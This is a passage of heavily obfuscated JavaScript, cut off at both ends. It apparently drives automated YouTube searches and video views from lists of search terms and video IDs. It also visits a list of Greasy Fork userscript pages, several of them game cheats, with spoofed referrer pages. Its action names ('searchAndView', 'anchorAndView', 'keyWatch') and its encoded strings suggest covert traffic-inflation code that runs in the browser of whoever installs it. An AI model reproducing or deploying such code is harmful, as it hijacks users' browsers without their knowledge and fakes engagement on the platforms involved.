't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](-0x64 * -0x2 + 0x23c0 + 0x9 * -0x40e)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](-0x17ce + -0x6 * -0x2b + 0x16d6)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + a0(0x4) + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](-0x1 * -0xc53 + -0x333 * -0x4 + 0x4 * -0x647);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    a1(0x13) + 'A',
    '63-irfPjh2' + 'c',
    a0(0x5) + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    a1(0xd) + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + a0(0x1b) + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + a0(0x8) + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': a0(0x2) + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + Z(0x3, '!Vq9') + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + Z(0x12, 'HtOA') + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
